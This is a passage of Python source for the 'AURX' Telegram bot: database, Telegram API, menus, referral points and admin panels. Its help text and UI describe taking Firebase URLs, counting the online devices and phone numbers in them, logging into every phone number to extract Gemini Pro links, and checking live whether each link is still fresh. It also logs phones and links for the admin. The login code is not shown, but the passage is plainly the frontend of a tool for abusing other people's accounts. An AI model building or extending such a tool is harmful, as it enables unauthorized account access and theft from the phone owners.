                             (now - 7 * 86400,)).fetchone()[0]
            tp = c.execute("SELECT COALESCE(SUM(points),0) FROM users").fetchone()[0]
            tr = c.execute("SELECT COALESCE(SUM(refer_count),0) FROM users").fetchone()[0]
            runs = c.execute("SELECT COUNT(*) FROM runs").fetchone()[0]
        return {"total": total, "active": active, "day": day, "week": week,
                "total_points": tp, "total_refs": tr, "runs": runs}

    def log_run(self, uid: int, result: str):
        with self.lock, self._conn() as c:
            c.execute("INSERT INTO runs (user_id, started_at, result) VALUES (?,?,?)",
                      (uid, time.time(), result))
            c.commit()

    def top_referrers(self, limit: int = 10) -> list[sqlite3.Row]:
        with self._conn() as c:
            return c.execute(
                "SELECT user_id, username, first_name, refer_count, points "
                "FROM users WHERE refer_count>0 ORDER BY refer_count DESC LIMIT ?",
                (limit,)).fetchall()

    def add_user_firebase(self, uid: int, url: str) -> bool:
        with self.lock, self._conn() as c:
            try:
                c.execute("INSERT INTO user_firebases (user_id, url, added_at) VALUES (?,?,?)",
                          (uid, url, time.time()))
                c.commit()
                return True
            except sqlite3.IntegrityError:
                return False

    def user_firebases(self, uid: int) -> list[str]:
        with self._conn() as c:
            rows = c.execute("SELECT url FROM user_firebases WHERE user_id=? ORDER BY added_at",
                             (uid,)).fetchall()
            return [r["url"] for r in rows]

    def clear_user_firebases(self, uid: int):
        with self.lock, self._conn() as c:
            c.execute("DELETE FROM user_firebases WHERE user_id=?", (uid,))
            c.commit()

    # ---- history (per-user + admin all) ----
    def add_history(self, *, user_id: int, firebase: str, phone: str,
                    url: str, status: str, reason: str = ""):
        with self.lock, self._conn() as c:
            c.execute("""INSERT INTO history
                (user_id, firebase, phone, url, status, reason, added_at)
                VALUES (?,?,?,?,?,?,?)""",
                (user_id, firebase, phone, url, status, reason, time.time()))
            c.commit()

    def user_history(self, uid: int, limit: int = 100) -> list[sqlite3.Row]:
        with self._conn() as c:
            return c.execute(
                "SELECT * FROM history WHERE user_id=? "
                "ORDER BY added_at DESC LIMIT ?",
                (uid, limit)).fetchall()

    def count_user_history(self, uid: int) -> int:
        with self._conn() as c:
            return c.execute("SELECT COUNT(*) FROM history WHERE user_id=?",
                             (uid,)).fetchone()[0]

    def count_all_history(self) -> int:
        with self._conn() as c:
            return c.execute("SELECT COUNT(*) FROM history").fetchone()[0]

    def all_history(self, limit: int = 500) -> list[sqlite3.Row]:
        with self._conn() as c:
            return c.execute("SELECT * FROM history ORDER BY added_at DESC LIMIT ?",
                             (limit,)).fetchall()


# ───────────────────────────────────────────────────────────────────────
#  Telegram
# ───────────────────────────────────────────────────────────────────────
class Telegram:
    def __init__(self, token: str):
        self.token = token
        self.api = f"https://api.telegram.org/bot{token}"
        self._offset = 0

    def _call(self, method: str, params: Optional[dict] = None,
              timeout: float = 60.0) -> dict:
        url = f"{self.api}/{method}"
        data = json.dumps(params).encode("utf-8") if params is not None else None
        req = urllib.request.Request(
            url, data=data, headers={"Content-Type": "application/json"},
            method="POST")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            try:
                return json.loads(body)
            except Exception:
                return {"ok": False, "description": f"HTTP {e.code}: {body}"}
        except Exception as e:
            return {"ok": False, "description": str(e)}

    def send_message(self, chat_id: int, text: str, *, parse_mode: str = "HTML",
                     reply_markup: Optional[dict] = None) -> dict:
        p = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode,
             "disable_web_page_preview": True}
        if reply_markup:
            p["reply_markup"] = reply_markup
        return self._call("sendMessage", p)

    def edit_message(self, chat_id: int, message_id: int, text: str, *,
                     parse_mode: str = "HTML",
                     reply_markup: Optional[dict] = None) -> dict:
        p = {"chat_id": chat_id, "message_id": message_id, "text": text,
             "parse_mode": parse_mode, "disable_web_page_preview": True}
        if reply_markup:
            p["reply_markup"] = reply_markup
        return self._call("editMessageText", p)

    def send_document(self, chat_id: int, filename: str, content: bytes,
                      caption: str = "") -> dict:
        boundary = "----AURX" + str(int(time.time() * 1000))
        body = io.BytesIO()

        def w(s):
            body.write(s if isinstance(s, bytes) else s.encode("utf-8"))

        w(f"--{boundary}\r\n")
        w(f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n')
        if caption:
            w(f"--{boundary}\r\n")
            w(f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n')
            w(f"--{boundary}\r\n")
            w('Content-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n')
        w(f"--{boundary}\r\n")
        w(f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n')
        w("Content-Type: application/octet-stream\r\n\r\n")
        w(content)
        w(f"\r\n--{boundary}--\r\n")
        req = urllib.request.Request(
            f"{self.api}/sendDocument",
            data=body.getvalue(),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            method="POST")
        try:
            with urllib.request.urlopen(req, timeout=120) as r:
                return json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            return {"ok": False,
                    "description": e.read().decode("utf-8", errors="replace")}
        except Exception as e:
            return {"ok": False, "description": str(e)}

    def answer_callback(self, cb_id: str, text: str = "", alert: bool = False) -> dict:
        return self._call("answerCallbackQuery",
                          {"callback_query_id": cb_id, "text": text,
                           "show_alert": alert})

    def get_updates(self, timeout: int = 30) -> list[dict]:
        r = self._call("getUpdates",
                       {"offset": self._offset, "timeout": timeout,
                        "allowed_updates": ["message", "callback_query"]},
                       timeout=timeout + 15)
        if not r.get("ok"):
            time.sleep(3)
            return []
        updates = r.get("result", [])
        for u in updates:
            self._offset = max(self._offset, u["update_id"] + 1)
        return updates

    def get_chat_member(self, chat_id: str, user_id: int) -> dict:
        return self._call("getChatMember", {"chat_id": chat_id, "user_id": user_id})

    def get_me(self) -> dict:
        return self._call("getMe")


# ───────────────────────────────────────────────────────────────────────
#  Keyboards
# ───────────────────────────────────────────────────────────────────────
def kb_main(is_admin: bool = False) -> dict:
    rows = [
        [{"text": "🚀 Start Automation", "callback_data": "pick_fb"}],
        [{"text": "📜 My History", "callback_data": "my_history"},
         {"text": "🔥 Manage Firebase", "callback_data": "fb_menu"}],
        [{"text": "👤 My Profile", "callback_data": "profile"},
         {"text": "🎁 Refer & Earn", "callback_data": "refer"}],
        [{"text": "🏆 Leaderboard", "callback_data": "top"},
         {"text": "📖 How To Use", "callback_data": "help"}],
    ]
    if is_admin:
        rows.append([{"text": "🛡 Admin Panel", "callback_data": "admin"}])
    return {"inline_keyboard": rows}


def kb_join() -> dict:
    rows = [[{"text": f"➡️ {c['label']}", "url": c["url"]}] for c in FORCED_CHANNELS]
    rows.append([{"text": "✅ I've Joined — Verify", "callback_data": "verify_join"}])
    return {"inline_keyboard": rows}


def kb_back(target: str = "home") -> dict:
    return {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": target}]]}


def kb_fb_menu() -> dict:
    return {"inline_keyboard": [
        [{"text": "➕ Add Firebase (single/bulk)", "callback_data": "fb_add"}],
        [{"text": "📋 My Firebases", "callback_data": "fb_list"}],
        [{"text": "🗑 Clear My Firebases", "callback_data": "fb_clear"}],
        [{"text": "🔙 Back", "callback_data": "home"}],
    ]}


def kb_admin() -> dict:
    return {"inline_keyboard": [
        [{"text": "📊 Statistics", "callback_data": "admin_stats"}],
        [{"text": "👥 Users List", "callback_data": "admin_users:0"}],
        [{"text": "🏆 Top Referrers", "callback_data": "admin_top"}],
        [{"text": "🌐 All Firebases", "callback_data": "admin_fb_list"}],
        [{"text": "🆕 New Firebases Found", "callback_data": "admin_fb_new"}],
        [{"text": "📄 Gemini Users File", "callback_data": "admin_gemini_users"}],
        [{"text": "📜 All History", "callback_data": "admin_all_history"}],
        [{"text": "➕ Add Points", "callback_data": "admin_add"}],
        [{"text": "➖ Subtract Points", "callback_data": "admin_sub"}],
        [{"text": "📢 Broadcast", "callback_data": "admin_broadcast"}],
        [{"text": "🔙 Back", "callback_data": "home"}],
    ]}


# ───────────────────────────────────────────────────────────────────────
#  Auth
# ───────────────────────────────────────────────────────────────────────
class Auth:
    def __init__(self, tg: Telegram, db: DB):
        self.tg = tg
        self.db = db
        self._cache: dict[int, tuple[bool, float]] = {}
        self._cache_ttl = 120.0

    def is_joined_all(self, uid: int) -> bool:
        now = time.time()
        cached = self._cache.get(uid)
        if cached and now - cached[1] < self._cache_ttl:
            return cached[0]
        for ch in FORCED_CHANNELS:
            r = self.tg.get_chat_member(ch["chat"], uid)
            if not r.get("ok"):
                self._cache[uid] = (False, now)
                return False
            if r.get("result", {}).get("status", "") in ("left", "kicked"):
                self._cache[uid] = (False, now)
                return False
        self._cache[uid] = (True, now)
        return True

    def invalidate(self, uid: int):
        self._cache.pop(uid, None)

    def access_left_seconds(self, uid: int) -> int:
        row = self.db.get_user(uid)
        if not row:
            return 0
        return max(0, int(float(row["access_until"] or 0) - time.time()))

    def has_access(self, uid: int) -> bool:
        return self.access_left_seconds(uid) > 0


# ───────────────────────────────────────────────────────────────────────
#  UI text helpers
# ───────────────────────────────────────────────────────────────────────
def fmt_duration(seconds: int) -> str:
    seconds = max(0, int(seconds))
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h or d: parts.append(f"{h}h")
    if m or h or d: parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)


def short_fb(url: str, n: int = 40) -> str:
    u = url.replace("https://", "").replace("http://", "").rstrip("/")
    if len(u) <= n:
        return u
    return u[:n - 1] + "…"


def status_emoji(s: str) -> str:
    if s == "fresh":
        return "🟢"
    if s == "used":
        return "🔴"
    return "⚪"


def status_label(s: str) -> str:
    if s == "fresh":
        return "FRESH"
    if s == "used":
        return "USED/EXPIRED"
    return "UNKNOWN"


def home_text(user: sqlite3.Row, auth: Auth) -> str:
    left = auth.access_left_seconds(user["user_id"])
    access_line = (f"🟢 <b>Active</b> — {fmt_duration(left)} left"
                   if left > 0 else "🔴 <b>No Access</b> — refer friends to unlock")
    return (
        f"╔══════════════════════════════════╗\n"
        f"║   <b>⚡ {BRAND} AUTOMATION HUB ⚡</b>   ║\n"
        f"╚══════════════════════════════════╝\n\n"
        f"👋 Welcome, <b>{esc(user['first_name'] or 'User')}</b>!\n\n"
        f"💎 <b>Points:</b> <code>{user['points']}</code>\n"
        f"🎁 <b>Referrals:</b> <code>{user['refer_count']}</code>\n"
        f"🔑 <b>Access:</b> {access_line}\n\n"
        f"<i>Tap 🚀 Start Automation and pick which Firebase(s) to scan. "
        f"Every Gemini link is tested live — 🟢 fresh, 🔴 used, ⚪ unknown.</i>"
    )


def referral_link(bot_username: str, uid: int) -> str:
    return f"https://t.me/{bot_username}?start=ref_{uid}"


def refer_text(user: sqlite3.Row, bot_username: str) -> str:
    link = referral_link(bot_username, user["user_id"])
    return (
        f"╔══════════════════════════════════╗\n"
        f"║       <b>🎁 REFER & EARN</b>         ║\n"
        f"╚══════════════════════════════════╝\n\n"
        f"🔗 <b>Your Referral Link:</b>\n<code>{esc(link)}</code>\n\n"
        f"📊 Referrals: <code>{user['refer_count']}</code>\n"
        f"💎 Points: <code>{user['points']}</code>\n\n"
        f"1 referral = 1 point = 1 hour access."
    )


def help_text() -> str:
    return (
        f"╔══════════════════════════════════╗\n"
        f"║         <b>📖 HOW TO USE</b>         ║\n"
        f"╚══════════════════════════════════╝\n\n"
        f"<b>1️⃣ Join Required Channels</b>\n\n"
        f"<b>2️⃣ Add Firebase</b>\n"
        f"   🔥 Manage Firebase → ➕ Add Firebase\n\n"
        f"<b>3️⃣ Start Automation</b>\n"
        f"   • Pick a specific Firebase or all\n"
        f"   • Bot logs into every phone number\n"
        f"   • Extracts the Gemini Pro link\n"
        f"   • Tests the link live on Google:\n"
        f"     🟢 <b>FRESH</b>   — activation page still open\n"
        f"     🔴 <b>USED</b>    — already redeemed / expired\n"
        f"     ⚪ <b>UNKNOWN</b> — Google unreachable\n"
        f"   • Sends <code>links.txt</code>\n\n"
        f"<b>4️⃣ My History</b>\n"
        f"   📜 See your own links. Only you + admin can view them.\n\n"
        f"<b>5️⃣ Need Help?</b>\n"
        f"   Contact: {esc('@UpdatesOnSupport11')}"
    )


def profile_text(user: sqlite3.Row, auth: Auth, fb_count: int,
                 hist_count: int) -> str:
    left = auth.access_left_seconds(user["user_id"])
    joined = datetime.fromtimestamp(user["joined_at"], tz=timezone.utc).strftime("%Y-%m-%d")
    return (
        f"╔══════════════════════════════════╗\n"
        f"║          <b>👤 MY PROFILE</b>          ║\n"
        f"╚══════════════════════════════════╝\n\n"
        f"🆔 <b>ID:</b> <code>{user['user_id']}</code>\n"
        f"👤 <b>Name:</b> {esc(user['first_name'] or '-')}\n"
        f"🔗 <b>Username:</b> @{esc(user['username'] or 'none')}\n\n"
        f"💎 <b>Points:</b> <code>{user['points']}</code>\n"
        f"🎁 <b>Referrals:</b> <code>{user['refer_count']}</code>\n"
        f"🔥 <b>Firebases saved:</b> <code>{fb_count}</code>\n"
        f"📜 <b>Links extracted:</b> <code>{hist_count}</code>\n"
        f"🔑 <b>Access:</b> {'🟢 ' + fmt_duration(left) if left else '🔴 Expired'}\n"
        f"📅 <b>Joined:</b> {joined}"
    )


def top_text(rows: list[sqlite3.Row]) -> str:
    medals = ["🥇", "🥈", "🥉"] + ["🏅"] * 20
    lines = [
        "╔══════════════════════════════════╗",
        "║       <b>🏆 TOP REFERRERS</b>        ║",
        "╚══════════════════════════════════╝",
        "",
    ]
    if not rows:
        lines.append("<i>No referrals yet — be the first!</i>")
    for i, r in enumerate(rows):
        name = r["first_name"] or r["username"] or f"User {r['user_id']}"
        lines.append(f"{medals[i]} <b>{esc(name)}</b> — {r['refer_count']} refs ({r['points']} pts)")
    return "\n".join(lines)


def admin_text(stats: dict, fb_count: int, fb_new_count: int,
               hist_count: int) -> str:
    return (
        f"╔══════════════════════════════════╗\n"
        f"║         <b>🛡 ADMIN PANEL</b>         ║\n"
        f"╚══════════════════════════════════╝\n\n"
        f"👥 <b>Total Users:</b> <code>{stats['total']}</code>\n"
        f"🟢 <b>Active Now:</b> <code>{stats['active']}</code>\n"
        f"📅 <b>Active (24h):</b> <code>{stats['day']}</code>\n"
        f"📆 <b>Active (7d):</b> <code>{stats['week']}</code>\n"
        f"💎 <b>Total Points:</b> <code>{stats['total_points']}</code>\n"
        f"🎁 <b>Total Referrals:</b> <code>{stats['total_refs']}</code>\n"
        f"🚀 <b>Automation Runs:</b> <code>{stats['runs']}</code>\n"
        f"🌐 <b>All Firebases:</b> <code>{fb_count}</code>\n"
        f"🆕 <b>New Firebases Found:</b> <code>{fb_new_count}</code>\n"
        f"📜 <b>Total Links Extracted:</b> <code>{hist_count}</code>"
    )


# ───────────────────────────────────────────────────────────────────────
#  Bot
# ───────────────────────────────────────────────────────────────────────
@dataclass
class UserState:
    action: Optional[str] = None
    data: Optional[dict] = None


class AurxBot:
    def __init__(self, tg: Telegram, db: DB, auth: Auth,
                 fb_registry: FirebaseRegistry, link_history: LinkHistory,
                 history_store: HistoryStore, admin_id: int):
        self.tg = tg
        self.db = db
        self.auth = auth
        self.fb_registry = fb_registry
        self.link_history = link_history
        self.history_store = history_store
        self.admin_id = admin_id
        self.bot_username = "AURXBot"
        self.states: dict[int, UserState] = {}
        self.states_lock = threading.Lock()
        self.cooldowns: dict[int, float] = {}
        self._fb_stats_cache: dict[str, tuple[dict, float]] = {}
        self._fb_stats_lock = threading.Lock()

    def _state(self, uid: int) -> UserState:
        with self.states_lock:
            return self.states.setdefault(uid, UserState())

    def _is_admin(self, uid: int) -> bool:
        return uid == self.admin_id

    def _gate(self, uid: int, cb_id: Optional[str] = None) -> bool:
        if self._is_admin(uid) or self.auth.is_joined_all(uid):
            return True
        if cb_id:
            self.tg.answer_callback(cb_id, "⚠️ Join both channels first!", alert=True)
        self.tg.send_message(uid, "🚫 <b>Access Locked</b>\n\nJoin both channels first:",
                             reply_markup=kb_join())
        return False

    def _ensure_user(self, from_user: dict):
        uid = from_user["id"]
        self.db.upsert_user(uid, from_user.get("username") or "",
                            from_user.get("first_name") or "")

    def _cached_fb_stats(self, fb: str, max_age: float = 600.0) -> dict:
        with self._fb_stats_lock:
            cached = self._fb_stats_cache.get(fb)
            if cached and time.time() - cached[1] < max_age:
                return cached[0]
        stats = fb_device_stats(fb, timeout=5.0)
        with self._fb_stats_lock:
            self._fb_stats_cache[fb] = (stats, time.time())
        return stats

    def _get_cached_fb_stats_only(self, fb: str,
                                  max_age: float = 600.0) -> Optional[dict]:
        with self._fb_stats_lock:
            cached = self._fb_stats_cache.get(fb)
            if cached and time.time() - cached[1] < max_age:
                return cached[0]
        return None

    # ---------- router ----------
    def handle_update(self, update: dict):
        try:
            if "message" in update:
                self._on_message(update["message"])
            elif "callback_query" in update:
                self._on_callback(update["callback_query"])
        except Exception:
            traceback.print_exc()

    def _on_message(self, msg: dict):
        from_user = msg.get("from") or {}
        uid = from_user.get("id")
        if not uid:
            return
        chat_id = msg["chat"]["id"]
        text = (msg.get("text") or "").strip()
        self._ensure_user(from_user)
        st = self._state(uid)

        if self._is_admin(uid) and st.action in ("add", "sub", "broadcast"):
            if text == "/cancel":
                st.action = None
                self.tg.send_message(chat_id, "❌ Cancelled.", reply_markup=kb_admin())
                return
            self._handle_admin_input(uid, chat_id, text)
            return

        if st.action == "fb_add":
            if text == "/cancel":
                st.action = None
                self.tg.send_message(chat_id, "❌ Cancelled.", reply_markup=kb_fb_menu())
                return
            self._handle_fb_add(uid, chat_id, text, from_user)
            return

        if text.startswith("/start"):
            parts = text.split(maxsplit=1)
            payload = parts[1].strip() if len(parts) > 1 else ""
            self._cmd_start(uid, chat_id, from_user, payload)
            return

        if text == "/admin" and self._is_admin(uid):
            self._send_admin_panel(chat_id, uid)
            return

        if text == "/history":
            self._send_my_history(chat_id, uid)
            return

        if text == "/firebase":
            self._send_fb_menu(chat_id, uid)
            return

        if text == "/cancel":
            st.action = None
            self.tg.send_message(chat_id, "❌ Cancelled.",
                                 reply_markup=kb_main(self._is_admin(uid)))
            return

        self._send_home(chat_id, uid)

    def _on_callback(self, cb: dict):
        uid = cb["from"]["id"]
        chat_id = cb["message"]["chat"]["id"]
        message_id = cb["message"]["message_id"]
        data = cb.get("data") or ""
        cb_id = cb["id"]
        self._ensure_user(cb["from"])

        st = self._state(uid)
        if st.action in ("add", "sub", "broadcast") and self._is_admin(uid):
            self.tg.answer_callback(cb_id, "Type input in chat. /cancel to abort.", alert=True)
            return
        if st.action == "fb_add":
            self.tg.answer_callback(cb_id, "Paste Firebase in chat. /cancel to abort.", alert=True)
            return

        if data == "verify_join":
            self.auth.invalidate(uid)
            if self.auth.is_joined_all(uid):
                self.tg.answer_callback(cb_id, "✅ Verified!", alert=False)
                self._send_home(chat_id, uid, edit=message_id)
            else:
                self.tg.answer_callback(cb_id, "❌ Not joined both channels yet.", alert=True)
            return

        if not self._gate(uid, cb_id):
            return

        # Home & basic
        if data == "home":
            self._send_home(chat_id, uid, edit=message_id)
        elif data == "profile":
            self._send_profile(chat_id, uid, edit=message_id)
        elif data == "refer":
            self._send_refer(chat_id, uid, edit=message_id)
        elif data == "help":
            self._send_help(chat_id, uid, edit=message_id)
        elif data == "top":
            self._send_top(chat_id, uid, edit=message_id)
        # History
        elif data == "my_history":
            self._send_my_history(chat_id, uid, edit=message_id)
        # Firebase picker
        elif data == "pick_fb":
            self._send_picker(chat_id, uid, edit=message_id, cb_id=cb_id)
        elif data == "pick_refresh":
            self.tg.answer_callback(cb_id, "🔄 Refreshing device counts…", alert=False)
            with self._fb_stats_lock:
                self._fb_stats_cache.clear()
            self._send_picker(chat_id, uid, edit=message_id, cb_id=None)
        elif data.startswith("pick_run:"):
            key = data.split(":", 1)[1]
            self._confirm_and_run(uid, chat_id, message_id, cb_id, key)
        # Firebase management
        elif data == "fb_menu":
            self._send_fb_menu(chat_id, uid, edit=message_id)
        elif data == "fb_add":
            self._prompt_fb_add(uid, chat_id)
        elif data == "fb_list":
            self._send_fb_list(chat_id, uid, edit=message_id)
        elif data == "fb_clear":
            self.db.clear_user_firebases(uid)
            self.tg.answer_callback(cb_id, "🗑 Cleared.", alert=False)
            self._send_fb_menu(chat_id, uid, edit=message_id)
        # Admin
        elif data == "admin":
            if self._is_admin(uid):
                self._send_admin_panel(chat_id, uid, edit=message_id)
            else:
                self.tg.answer_callback(cb_id, "❌ Admins only.", alert=True)
        elif data == "admin_stats":
            self._send_admin_panel(chat_id, uid, edit=message_id)
        elif data.startswith("admin_users:"):
            self._send_admin_users(chat_id, uid, int(data.split(":", 1)[1]), edit=message_id)
        elif data == "admin_top":
            self._send_admin_top(chat_id, uid, edit=message_id)
        elif data == "admin_fb_list":
            self._send_admin_fb_list(chat_id, uid, edit=message_id)
        elif data == "admin_fb_new":
            self._send_admin_fb_new(chat_id, uid, edit=message_id)
        elif data == "admin_gemini_users":
            self._send_admin_gemini_users(chat_id, uid, edit=message_id)
        elif data == "admin_all_history":
            self._send_admin_all_history(chat_id, uid, edit=message_id)
        elif data == "admin_add":
            self._prompt_admin_point(uid, chat_id, "add")
        elif data == "admin_sub":
            self._prompt_admin_point(uid, chat_id, "sub")
        elif data == "admin_broadcast":
            self._prompt_broadcast(uid, chat_id)
        else:
            self.tg.answer_callback(cb_id, "Unknown action.", alert=False)

    def _cmd_start(self, uid: int, chat_id: int, from_user: dict, payload: str):
        if payload.startswith("ref_"):
            try:
                ref_id = int(payload[4:])
            except ValueError:
                ref_id = 0
            if ref_id and ref_id != uid and self.db.set_referrer(uid, ref_id):
                new_points = self.db.add_points(ref_id, POINTS_PER_REFERRAL)
                try:
                    self.tg.send_message(
                        ref_id,
                        f"🎉 <b>New Referral!</b>\n"
                        f"👤 {esc(from_user.get('first_name') or 'Someone')}\n"
                        f"💎 +{POINTS_PER_REFERRAL} point\n"
                        f"📊 Total: <code>{new_points}</code>")
                except Exception:
                    pass
        if not self._gate(uid):
            return
        self._send_home(chat_id, uid, greet=True)

    # ---------- simple panels ----------
    def _send_home(self, chat_id: int, uid: int, *, edit: Optional[int] = None,
                   greet: bool = False):
        row = self.db.get_user(uid)
        if not row:
            return
        text = home_text(row, self.auth)
        if greet:
            text = f"🎉 <b>Welcome to {BRAND}!</b>\n\n" + text
        markup = kb_main(self._is_admin(uid))
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=markup)
        else:
            self.tg.send_message(chat_id, text, reply_markup=markup)

    def _send_profile(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        row = self.db.get_user(uid)
        fb_count = len(self.db.user_firebases(uid))
        hist_count = self.history_store.count_user(uid)
        text = profile_text(row, self.auth, fb_count, hist_count)
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_back())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_back())

    def _send_refer(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        row = self.db.get_user(uid)
        text = refer_text(row, self.bot_username)
        share = {"inline_keyboard": [
            [{"text": "📤 Share Link",
              "url": f"https://t.me/share/url?url={urllib.parse.quote(referral_link(self.bot_username, uid))}&text=Join%20{BRAND}%20Bot"}],
            [{"text": "🔙 Back", "callback_data": "home"}]]}
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=share)
        else:
            self.tg.send_message(chat_id, text, reply_markup=share)

    def _send_help(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        text = help_text()
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_back())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_back())

    def _send_top(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        rows = self.db.top_referrers(10)
        text = top_text(rows)
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_back())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_back())

    # ---------- My History ----------
    def _send_my_history(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        rows = self.history_store.user_history(uid, limit=40)
        total = self.history_store.count_user(uid)
        if not rows:
            text = (
                "╔══════════════════════════════════╗\n"
                "║         <b>📜 MY HISTORY</b>         ║\n"
                "╚══════════════════════════════════╝\n\n"
                "<i>You haven't extracted any links yet.</i>\n"
                "Tap 🚀 Start Automation to begin."
            )
        else:
            fresh = sum(1 for r in rows if r["status"] == "fresh")
            used = sum(1 for r in rows if r["status"] == "used")
            unk = sum(1 for r in rows if r["status"] == "unknown")
            lines = [
                "╔══════════════════════════════════╗",
                "║         <b>📜 MY HISTORY</b>         ║",
                "╚══════════════════════════════════╝", "",
                f"📊 Total: <code>{total}</code>  (shown: {len(rows)})",
                f"🟢 Fresh: <code>{fresh}</code>   🔴 Used: <code>{used}</code>   ⚪ Unknown: <code>{unk}</code>",
                "",
            ]
            for r in rows:
                emoji = status_emoji(r["status"])
                when = datetime.fromtimestamp(r["added_at"], tz=timezone.utc)\
                    .strftime("%m-%d %H:%M")
                url = r["url"]
                url_short = url if len(url) <= 72 else url[:69] + "…"
                lines.append(
                    f"{emoji} <b>{status_label(r['status'])}</b>  "
                    f"<code>{esc(url_short)}</code>\n"
                    f"   ☎️ {esc(r['phone'] or '-')}  |  "
                    f"🔥 <code>{esc(short_fb(r['firebase'] or '-', 30))}</code>\n"
                    f"   🕒 {when}"
                )
            text = "\n".join(lines)

        # Also attach a downloadable file
        file_lines = ["# AURX — My Link History",
                      f"# User ID: {uid}",
                      f"# Total  : {total}", ""]
        for r in rows:
            when = datetime.fromtimestamp(r["added_at"], tz=timezone.utc)\
                .strftime("%Y-%m-%d %H:%M")
            file_lines.append(
                f"[{status_label(r['status']):<12}] {r['url']}\n"
                f"    phone={r['phone']}  firebase={r['firebase']}  at={when}"
            )
        content = ("\n".join(file_lines) + "\n").encode("utf-8")

        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_back())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_back())
        try:
            self.tg.send_document(chat_id, f"my_history_{uid}.txt", content,
                                  caption=f"📜 My history ({total} links)")
        except Exception:
            pass

    # ---------- Firebase picker ----------
    def _send_picker(self, chat_id: int, uid: int, *, edit: Optional[int] = None,
                     cb_id: Optional[str] = None):
        row = self.db.get_user(uid)
        if not row:
            return
        if not self.auth.has_access(uid):
            if cb_id:
                self.tg.answer_callback(cb_id, "🔒 No access. Refer friends first!", alert=True)
            text = "🔒 <b>Access Locked</b>\n\n1 referral = 1 point = 1 hour."
            if edit:
                self.tg.edit_message(chat_id, edit, text,
                                     reply_markup=kb_main(self._is_admin(uid)))
            else:
                self.tg.send_message(chat_id, text,
                                     reply_markup=kb_main(self._is_admin(uid)))
            return

        fbs = self.db.user_firebases(uid)
        if not fbs:
            if cb_id:
                self.tg.answer_callback(cb_id, "🔥 Add a Firebase first!", alert=True)
            self._send_fb_menu(chat_id, uid, edit=edit)
            return

        with self.states_lock:
            self._state(uid).data = {"picker": fbs}

        cached: dict[str, Optional[dict]] = {
            fb: self._get_cached_fb_stats_only(fb) for fb in fbs
        }
        missing = [fb for fb, s in cached.items() if s is None]

        text, markup = self._render_picker(uid, fbs, cached, loading=bool(missing))

        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=markup)
            message_id = edit
        else:
            r = self.tg.send_message(chat_id, text, reply_markup=markup)
            message_id = r.get("result", {}).get("message_id")
        if not message_id:
            return

        if not missing:
            if cb_id:
                self.tg.answer_callback(cb_id, "", alert=False)
            return

        if cb_id:
            self.tg.answer_callback(cb_id, "🔄 Fetching device counts…", alert=False)

        def fetch_missing():
            results: dict[str, dict] = {}
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=min(6, len(missing))) as ex:
                futs = {ex.submit(self._cached_fb_stats, fb): fb for fb in missing}
                for fut in concurrent.futures.as_completed(futs):
                    fb = futs[fut]
                    try:
                        results[fb] = fut.result()
                    except Exception:
                        results[fb] = {"total": 0, "online": 0, "phones": 0}
            for fb, s in results.items():
                cached[fb] = s
            try:
                text2, markup2 = self._render_picker(uid, fbs, cached, loading=False)
                self.tg.edit_message(chat_id, message_id, text2, reply_markup=markup2)
            except Exception:
                traceback.print_exc()

        threading.Thread(target=fetch_missing, daemon=True).start()

    def _render_picker(self, uid: int, fbs: list[str],
                       stats_by_fb: dict[str, Optional[dict]],
                       *, loading: bool = False) -> tuple[str, dict]:
        rows: list[list[dict]] = []
        total_online = 0
        total_phones = 0
        unknown_count = 0
        for i, fb in enumerate(fbs):
            s = stats_by_fb.get(fb)
            if s is None:
                unknown_count += 1
                label = f"{i+1}. {short_fb(fb, 34)} • ⏳"
            else:
                total_online += s["online"]
                total_phones += s["phones"]
                label = (f"{i+1}. {short_fb(fb, 34)} • "
                         f"🟢{s['online']}/{s['total']} ☎️{s['phones']}")
            rows.append([{"text": label, "callback_data": f"pick_run:{i}"}])

        rows.append([{
            "text": f"🌐 All Firebases ({total_online} online, {total_phones} phones)",
            "callback_data": "pick_run:all"
        }])
        rows.append([{"text": "🔄 Refresh counts", "callback_data": "pick_refresh"},
                     {"text": "🔙 Back", "callback_data": "home"}])

        status_line = ""
        if loading and unknown_count:
            status_line = f"\n⏳ <i>Fetching {unknown_count} Firebase(s)…</i>"

        text = (
            f"╔══════════════════════════════════╗\n"
            f"║     <b>🎯 SELECT FIREBASE</b>       ║\n"
            f"╚══════════════════════════════════╝\n\n"
            f"🔥 <b>Your Firebases:</b> <code>{len(fbs)}</code>\n"
            f"🟢 <b>Online devices:</b> <code>{total_online}</code>\n"
            f"☎️ <b>Phone numbers:</b> <code>{total_phones}</code>"
            f"{status_line}\n\n"
            f"<i>Pick one Firebase, or run all at once.</i>"
        )
        return text, {"inline_keyboard": rows}

